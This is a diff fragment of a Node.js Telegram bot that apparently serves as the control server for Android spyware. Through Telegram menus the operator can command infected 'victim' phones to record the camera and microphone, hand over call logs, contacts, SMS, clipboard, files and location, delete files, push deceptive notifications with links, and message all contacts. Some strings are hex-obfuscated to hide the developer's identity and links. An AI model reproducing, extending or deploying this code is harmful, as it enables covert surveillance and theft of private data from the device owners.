+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
+            const duration = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`rec_camera_selfie:${duration}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
+                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور الهكر الغامض شخصيا 😴 معرف المطور @VIP_MFM ،',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
+            const toastMessage = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`toast:${toastMessage}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
+            const notificationMessage = message.text
+            currentTitle = notificationMessage
+            appBot.sendMessage(id,
+                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
+                '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
+                {reply_markup: {force_reply: true}}
+            )
+        }
+        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
+            const link = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`show_notification:${currentTitle}/${link}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
+            const audioLink = message.text
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`play_audio:${audioLink}`)
+                }
+            });
+            currentUuid = ''
+const _0x2f4e=['\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c'];
+
+            appBot[_0x2f4e[0x0]](id,
+                _0x2f4e[0x1] +
+                _0x2f4e[0x2],
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+    }
+    const _0x1f2d=['\x69\x64','\x74\x65\x78\x74','\x2f\x73\x74\x61\x72\x74','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0645\u0631\u062d\u0628\u0627\x20\u0628\u0643\u0645\x20\u0641\u064a\x20\u0628\u0648\u062a\x20\u0627\u0644\u0627\u062e\u062a\u0631\u0627\u0642\x20\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0628\u0648\u062a\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x0a\x0a','\u2022\x20\u0625\u0630\u0627\x20\u0643\u0627\u0646\x20\u0627\u0644\u062a\u0637\u0628\u064a\u0642\x20\u0645\u062b\u0628\u062a\u064b\u0627\x20\u0639\u0644\u0649\x20\u0627\u0644\u062c\u0647\u0627\u0632\x20\u0627\u0644\u0645\u0633\u062a\u0647\u062f\u0641\x20\u060c\x20\u0641\u0627\u0646\u062a\u0638\u0631\x20\u0627\u0644\u0627\u062a\u0635\u0627\u0644\x0a\x0a','\u2022\x20\u0639\u0646\u062f\u0645\u0627\x20\u062a\u062a\u0644\u0642\u0649\x20\u0631\u0633\u0627\u0644\u0629\x20\u0627\u0644\u0627\u062a\u0635\u0627\u0644\x20\u060c\x20\u0641\u0647\u0630\u0627\x20\u064a\u0639\u0646\u064a\x20\u0623\u0646\x20\u0627\u0644\u062c\u0647\u0627\u0632\x20\u0627\u0644\u0645\u0633\u062a\u0647\u062f\u0641\x20\u0645\u062a\u0635\u0644\x20\u0648\u062c\u0627\u0647\u0632\x20\u0644\u0627\u0633\u062a\u0644\u0627\u0645\x20\u0627\u0644\u0623\u0645\u0631\x0a\x0a','\u2022\x20\u0627\u0646\u0642\u0631\x20\u0639\u0644\u0649\x20\u0632\u0631\x20\u0627\u0644\u0623\u0645\u0631\x20\u0648\u062d\u062f\u062f\x20\u0627\u0644\u062c\u0647\u0627\u0632\x20\u0627\u0644\u0645\u0637\u0644\u0648\u0628\x20\u062b\u0645\x20\u062d\u062f\u062f\x20\u0627\u0644\u0623\u0645\u0631\x20\u0627\u0644\u0645\u0637\u0644\u0648\u0628\x20\u0628\u064a\u0646\x20\u0627\u0644\u0623\u0645\u0631\x0a\x0a','\u2022\x20\u0625\u0630\u0627\x20\u0639\u0644\u0642\u062a\x20\u0641\u064a\x20\u0645\u0643\u0627\u0646\x20\u0645\u0627\x20\u0641\u064a\x20\u0627\u0644\u0631\u0648\u0628\u0648\u062a\x20\u060c\x20\u0623\u0631\u0633\u0644\x20\x2f\x73\x74\x61\x72\x74\x20\x20\u0627\u0644\u0623\u0645\u0631\x20\u060c'];
+
+if(chatId == id){
+    if(message[_0x1f2d[0x1]]==_0x1f2d[0x2]){
+        appBot[_0x1f2d[0x3]](id,
+            _0x1f2d[0x4]+
+            _0x1f2d[0x5]+
+            _0x1f2d[0x6]+
+            _0x1f2d[0x7]+
+            _0x1f2d[0x8],
+            {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+    "keyboard": [
+        ["الاجهزة المتصلة"], 
+        ["تنفيذ الامر"],
+        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
+        ["📢 قناة التليجرام"]
+    ],
+    'resize_keyboard': true
+}
+                }
+            )
+        }
+        const _0x3f4d=['\x74\x65\x78\x74','\ud83d\udcac\x20\u0648\u0627\u062a\u0633\u0627\u0628\x20\u0627\u0644\u0645\u0637\u0648\u0631','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x61\x2e\x6d\x65\x2f\x39\x36\x37\x37\x37\x36\x30\x38\x30\x35\x31\x33','\ud83d\udcfa\x20\u0642\u0646\u0627\u0629\x20\u0627\u0644\u064a\u0648\u062a\u064a\u0648\u0628','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x75\x73\x65\x72\x2d\x61\x66\x65\x3f\x73\x69\x3d\x5f\x41\x2d\x7a\x35\x6a\x5a\x68\x50\x48\x4d\x34\x34\x64\x34\x33','\ud83d\udce2\x20\u0642\u0646\u0627\u0629\x20\u0627\u0644\u062a\u0644\u064a\u062c\u0631\u0627\u0645','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x6d\x75\x68\x5f\x37\x33\x39'];
+
+if(message[_0x3f4d[0x0]]==_0x3f4d[0x1]){
+    appBot[_0x3f4d[0x2]](id,_0x3f4d[0x3])
+}
+
+if(message[_0x3f4d[0x0]]==_0x3f4d[0x4]){
+    appBot[_0x3f4d[0x2]](id,_0x3f4d[0x5])
+}
+
+if(message[_0x3f4d[0x0]]==_0x3f4d[0x6]){
+    appBot[_0x3f4d[0x2]](id,_0x3f4d[0x7])
+}
+        if (message.text == 'الاجهزة المتصلة') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
+                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                )
+            } else {
+                let text = '°• قائمة الاجهزة المتصلة :\n\n'
+                appClients.forEach(function (value, key, map) {
+                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
+                        `• البطارية : <b>${value.battery}</b>\n` +
+                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
+                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
+                        `• مزود : <b>${value.provider}</b>\n\n`
+                })
+                appBot.sendMessage(id, text, {parse_mode: "HTML"})
+            }
+        }
+        if (message.text == 'تنفيذ الامر') {
+            if (appClients.size == 0) {
+                appBot.sendMessage(id,
+                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
+                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
+                )
+            } else {
+                const deviceListKeyboard = []
+                appClients.forEach(function (value, key, map) {
+                    deviceListKeyboard.push([{
+                        text: value.model,
+                        callback_data: 'device:' + key
+                    }])
+                })
+                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
+                    "reply_markup": {
+                        "inline_keyboard": deviceListKeyboard,
+                    },
+                })
+            }
+        }
+    } else {
+        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
+    }
+})
+appBot.on("callback_query", (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data
+    const commend = data.split(':')[0]
+    const uuid = data.split(':')[1]
+    console.log(uuid)
+    if (commend == 'device') {
+        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
+            width: 10000,
+            chat_id: id,
+            message_id: msg.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
+                        {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
+                    ],
+                    [
+                        {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
+                        {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
+                    ],
+                    [
+                        {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
+                        {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`},
+                    ],
+                    [
+                        {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
+                        {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
+                    ],
+                    [
+                        {text: '🚩الموقع', callback_data: `location:${uuid}`},
+                        {text: '👹نخب', callback_data: `toast:${uuid}`}
+                    ],
+                    [
+                        {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
+                        {text: 'جهات الاتصال👤', callback_data: `contacts:${uuid}`}
+                    ],
+                    [
+                        {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
+                        {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
+                    ],
+                    [
+                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
+                        {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
+                    ],
+                    [
+                        {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
+                        {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
+                    ],
+                    [
+                        {
+                            text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
+                            callback_data: `send_message_to_all:${uuid}`
+                        }
+                    ],
+                ]
+            },
+            parse_mode: "HTML"
+        })
+    }
+    if (commend == 'calls') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('calls');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'contacts') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('contacts');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'messages') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('messages');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'apps') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('apps');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'device_info') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('device_info');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'clipboard') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('clipboard');
+            }
+        });
+        const _0x4e2b=['\x64\x65\x6c\x65\x74\x65\x4d\x65\x73\x73\x61\x67\x65','\x6d\x65\x73\x73\x61\x67\x65\x5f\x69\x64','\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65','\xb0\u2022\x20\u0637\u0644\u0628\u0643\x20\u0642\u064a\u062f\x20\u0627\u0644\u0645\u0639\u0627\u0644\u062c\u0629\x20\u0627\u0644\u0631\u062c\u0627\u0621\x20\u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x2e\x0a\x0a','\u2022\x20\u0633\u062a\u062a\u0644\u0642\u0649\x20\u0631\u062f\u064b\u0627\x20\u0641\u064a\x20\u0627\u0644\u0644\u062d\u0638\u0627\u062a\x20\u0627\u0644\u0642\u0644\u064a\u0644\u0629\x20\u0627\u0644\u0642\u0627\u062f\u0645\u0629\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\u0627\u0644\u0647\u0643\u0631\x20\u0627\u0644\u063a\u0627\u0645\u0636\x20\u0634\u062e\u0635\u064a\u0627\x20\ud83d\ude34\x20\u0645\u0639\u0631\u0641\x20\u0627\u0644\u0645\u0637\u0648\u0631\x20\x40\x56\x49\x50\x5f\x4d\x46\x4d\x20\u060c','\x48\x54\x4D\x4C','\x6B\x65\x79\x62\x6F\x61\x72\x64','\u0627\u0644\u0627\u062c\u0647\u0632\u0629\x20\u0627\u0644\u0645\u062a\u0635\u0644\u0629','\u062a\u0646\u0641\u064a\u0630\x20\u0627\u0644\u0627\u0645\u0631','\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64'];
+
+appBot[_0x4e2b[0x0]](id,msg[_0x4e2b[0x1]])
+appBot[_0x4e2b[0x2]](id,
+    _0x4e2b[0x3]+
+    _0x4e2b[0x4],
+    {
+        parse_mode:_0x4e2b[0x5],
+        reply_markup:{
+            [_0x4e2b[0x6]]:[
+                [_0x4e2b[0x7]],
+                [_0x4e2b[0x8]]
+            ],
+            [_0x4e2b[0x9]]:true
+        }
+    }
+)
+}
+    if (commend == 'camera_main') {
+        appSocket.clients.forEach(function each(ws) {
+            if (ws.uuid == uuid) {
+                ws.send('camera_main');
+            }
+        });
